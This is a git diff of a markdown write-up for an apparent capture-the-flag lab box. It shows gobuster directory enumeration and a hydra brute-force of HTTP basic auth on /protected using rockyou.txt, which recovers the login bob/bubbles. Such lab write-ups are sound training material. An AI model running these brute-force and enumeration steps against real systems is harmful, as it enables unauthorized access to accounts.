@@ -85,34 +85,49 @@ Next lets run a dir buster (wasn't getting results, so I had to reset the box wi
 
 ## Gobuster
 ```console
-gobuster dir -u http://10.10.110.225 -w /home/noob2uub/Documents/Wordlists/common.txt 
+gobuster dir -u http://10.10.160.183 -w /home/noob2uub/Documents/Wordlists/2.3-small.txt
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://10.10.110.225
+[+] Url:                     http://10.10.160.183
 [+] Method:                  GET
 [+] Threads:                 10
-[+] Wordlist:                /home/noob2uub/Documents/Wordlists/common.txt
+[+] Wordlist:                /home/noob2uub/Documents/Wordlists/2.3-small.txt
 [+] Negative Status codes:   404
 [+] User Agent:              gobuster/3.1.0
 [+] Timeout:                 10s
 ===============================================================
-2022/03/18 11:35:44 Starting gobuster in directory enumeration mode
+2022/03/18 12:30:39 Starting gobuster in directory enumeration mode
 ===============================================================
-/.hta                 (Status: 403) [Size: 292]
-/.htaccess            (Status: 403) [Size: 297]
-/.htpasswd            (Status: 403) [Size: 297]
-/guidelines           (Status: 301) [Size: 319] [--> http://10.10.110.225/guidelines/]
-/index.html           (Status: 200) [Size: 168]                                       
-/protected            (Status: 401) [Size: 460]                                       
-/server-status        (Status: 403) [Size: 301]                                       
-                                                                                      
-===============================================================
-2022/03/18 11:36:55 Finished
-===============================================================
+/guidelines           (Status: 301) [Size: 319] [--> http://10.10.160.183/guidelines/]
+/protected            (Status: 401) [Size: 460]    
+```
+Going to the main address we can see there is nothing here 
+![Screenshot_2022-03-18_11-52-30](https://user-images.githubusercontent.com/68706090/159074679-a3d6a87b-89a7-472d-8dbd-a72e182eabbb.png)
+
+So lets check nout /guidlines now
+Navigating to http://10.10.135.157/guidelines/ shows us this. We have a user name and confirming TomCat server thats runing on port 1234
+![Screenshot_2022-03-18_11-41-18](https://user-images.githubusercontent.com/68706090/159074671-80528e5b-cec9-4466-957c-1398ad966695.png)
+
+Now lets take a look at /protected
+![Screenshot_2022-03-18_12-53-34](https://user-images.githubusercontent.com/68706090/159074851-fab2db32-1b12-4909-aba8-cf3692b97280.png)
+
+looking at this we can see that we can use hydra using http-get 
+
+### Hydra
+```console
+hydra -l bob -P /home/noob2uub/Documents/Wordlists/rockyou.txt -f 10.10.160.183 http-get /protected/
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-18 12:51:29
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get://10.10.160.183:80/protected/
+[80][http-get] host: 10.10.160.183   login: bob   password: bubbles
+[STATUS] attack finished for 10.10.160.183 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-18 12:51:34
 ```
 
-Navigating to http://10.10.135.157/guidelines/ shows us this. We have a user name and confirming TomCat server thats runing on port 1234
 
-(https://user-images.githubusercontent.com/68706090/159064424-42c10906-6b0b-49e9-95e0-7fcd8690afb4.png)
+
